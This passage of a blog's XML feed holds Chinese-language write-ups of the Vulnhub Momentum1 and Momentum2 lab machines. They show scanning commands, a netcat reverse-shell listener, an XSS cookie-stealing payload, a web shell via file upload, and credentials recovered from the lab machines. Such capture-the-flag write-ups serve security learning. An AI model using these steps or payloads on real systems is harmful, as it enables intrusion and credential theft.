4433</code></p><p>kali：<code>nc -lvvp 4433</code></p><p><img src="/2025/01/18/Momentum2/image-20260118223026040.png"></p><h3>总结</h3><p>利用<code>nmap</code>、<code>arp-scan</code>做基础信息收集；<code>gobuster</code>进行目录扫描；根据泄露的<code>ajax.php.bak</code>备份文件内容构造文件上传数据包getshell；利用<code>蚁剑</code>连接一句话木马并得到ssh登录凭证；利用<code>cookie-gen.py</code>脚本文件进行反弹shell；获取最终Flag</p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Momentum1</title>
    <link href="/2025/01/18/Momentum1/"/>
    <url>/2025/01/18/Momentum1/</url>
    
    <content type="html"><![CDATA[<p>使用<code>nmap</code>和<code>arp-scan</code>进行基础的信息收集，根据<code>arp-scan</code>的主机存活探测知道<code>192.168.182.186</code>为靶机地址，<code>sudo nmap --script=vuln 192.168.182.186</code>进行漏洞脚本扫描</p><p><img src="/2025/01/18/Momentum1/image-20260118204719965.png"></p><p>可以看到开放了80和22两个端口，接下来使用<code>gobuster</code>进行目录扫描，<code>sudo gobuster dir -u http://192.168.182.186 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,zip</code>，通过<code>-x</code>参数添加更多文件后缀进行Fuzz</p><p><img src="/2025/01/18/Momentum1/image-20260118205054142.png"></p><p>可以看到扫出挺多东西，那么先访问80端口看看</p><p><img src="/2025/01/18/Momentum1/image-20260118205540630.png"></p><p>看到有四张图片，随便点一张看看</p><p><img src="/2025/01/18/Momentum1/image-20260118205632754.png"></p><p>发现关键字<code>id</code>，那么可以尝试SQL注入攻击或者命令执行等操作</p><p><img src="/2025/01/18/Momentum1/image-20260118205735102.png"></p><p>发现会直接打印输出，没什么用，那么试试XSS攻击。Payload：<code>opus-detail.php?id=&lt;script&gt;alert(alert(document.cookie))&lt;/script&gt;</code></p><p><img src="/2025/01/18/Momentum1/image-20260118210021640.png"></p><p>成功拿到Cookie值，然后在刚刚的目录扫描的&#x2F;img目录中发现一段js代码</p><p><img src="/2025/01/18/Momentum1/image-20260118210249758.png"></p><p>这里提示说需要去AES解密一串字符串，关键字<code>SecretPassphraseMomentum</code>，那应该就是上面所拿到的Cookie值了</p><p><img src="/2025/01/18/Momentum1/image-20260118210551039.png"></p><p>对Cookie值进行AES解密，得到凭据<code>auxerre-alienum##</code>，估计就是ssh的登录凭证了</p><p><img src="/2025/01/18/Momentum1/image-20260118210712681.png"></p><p>登录成功，试了几次才发现一整串才是密码，拿到<code>user.txt</code>flag，后面继续进行提权</p><p><img src="/2025/01/18/Momentum1/image-20260118210925884.png"></p><p>发现了<code>.rediscli_history</code>，说明有redis服务，进去看看也是拿到了<code>rootpass</code>，那么直接切换root账户就行</p><p><img src="/2025/01/18/Momentum1/image-20260118211118543.png"></p><h3>总结</h3><p>使用<code>nmap</code>和<code>arp-scan</code>进行基础信息收集；<code>gobuster</code>进行目录扫描；XSS弹Cookie；解密拿到ssh登录凭证；redis-cli拿到rootpass；切换至root账户获取最终Flag。</p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
